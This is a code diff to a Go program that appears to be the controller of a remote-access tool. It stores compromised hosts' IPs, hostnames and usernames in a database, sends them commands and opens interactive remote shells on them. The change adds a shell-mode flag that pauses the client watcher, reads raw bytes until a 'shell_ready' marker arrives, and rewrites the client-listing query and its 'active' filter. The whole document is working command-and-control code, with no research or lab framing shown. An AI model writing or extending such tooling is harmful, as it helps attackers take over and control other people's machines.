@@ -40,12 +40,13 @@ type Recon struct {
 }
 
 type Client struct {
-	ID      int
-	Conn    net.Conn
-	Addr    string
-	Recon   Recon
-	Encoder *json.Encoder
-	Decoder *json.Decoder
+	ID        int
+	Conn      net.Conn
+	Addr      string
+	Recon     Recon
+	Encoder   *json.Encoder
+	Decoder   *json.Decoder
+	ShellMode bool
 }
 
 var (
@@ -137,11 +138,13 @@ func dbMarkInactive(id int) {
 }
 
 func getAllClients(onlyActive bool) []map[string]interface{} {
-	query := "SELECT id, ip, public_ip, hostname, username, os, arch, first_seen, last_seen, active, reconnects FROM clients ORDER BY id"
+	var rows *sql.Rows
+	var err error
 	if onlyActive {
-		query = "SELECT id, ip, public_ip, hostname, username, os, arch, first_seen, last_seen, active, reconnects FROM clients WHERE active = 1 ORDER BY id"
+		rows, err = db.Query("SELECT id, ip, public_ip, hostname, username, os, arch, first_seen, last_seen, active, reconnects FROM clients WHERE active = 1 ORDER BY id")
+	} else {
+		rows, err = db.Query("SELECT id, ip, public_ip, hostname, username, os, arch, first_seen, last_seen, active, reconnects FROM clients ORDER BY id")
 	}
-	rows, err := db.Query(query)
 	if err != nil {
 		return nil
 	}
@@ -304,24 +307,6 @@ func sendCommand(c *Client, cmd string) error {
 	return c.Encoder.Encode(map[string]string{"cmd": cmd})
 }
 
-func readLine(conn net.Conn) (string, error) {
-	var buf []byte
-	tmp := make([]byte, 1)
-	for {
-		n, err := conn.Read(tmp)
-		if err != nil {
-			return "", err
-		}
-		if n == 0 {
-			continue
-		}
-		if tmp[0] == '\n' {
-			return string(buf), nil
-		}
-		buf = append(buf, tmp[0])
-	}
-}
-
 func handleShell(c *Client) {
 	fmt.Printf("Entering shell on client %d...\n", c.ID)
 
@@ -330,16 +315,25 @@ func handleShell(c *Client) {
 		return
 	}
 
-	// Read raw lines until we get shell_ready
+	// Set shell mode so watchClient stops reading
+	c.ShellMode = true
+	defer func() { c.ShellMode = false }()
+
+	// Read raw bytes until we get shell_ready
 	// This avoids json.Decoder buffering issues
+	buf := make([]byte, 0, 4096)
+	tmp := make([]byte, 1)
 	for {
-		line, err := readLine(c.Conn)
+		n, err := c.Conn.Read(tmp)
 		if err != nil {
 			fmt.Printf("connection lost: %v\n", err)
 			return
 		}
-		line = strings.TrimSpace(line)
-		if strings.Contains(line, "shell_ready") {
+		if n == 0 {
+			continue
+		}
+		buf = append(buf, tmp[0])
+		if strings.Contains(string(buf), "shell_ready") {
 			break
 		}
 	}
@@ -375,13 +369,19 @@ func handleShell(c *Client) {
 func watchClient(c *Client) {
 	var msg map[string]string
 	for {
+		if c.ShellMode {
+			time.Sleep(100 * time.Millisecond)
+			continue
+		}
 		if err := c.Decoder.Decode(&msg); err != nil {
 			break
 		}
 	}
-	removeClient(c.ID)
-	fmt.Printf("\n[!] client %d disconnected (%s@%s)\n", c.ID, c.Recon.Username, c.Recon.Hostname)
-	printPrompt()
+	if !c.ShellMode {
+		removeClient(c.ID)
+		fmt.Printf("\n[!] client %d disconnected (%s@%s)\n", c.ID, c.Recon.Username, c.Recon.Hostname)
+		printPrompt()
+	}
 }
 
 func main() {
@@ -424,7 +424,7 @@ func main() {
 
 		switch cmd {
 		case "/clients":
-			onlyActive := len(parts) > 2 && parts[1] == "active"
+			onlyActive := len(parts) > 1
 			listClients(onlyActive)
 
 		case "/check":
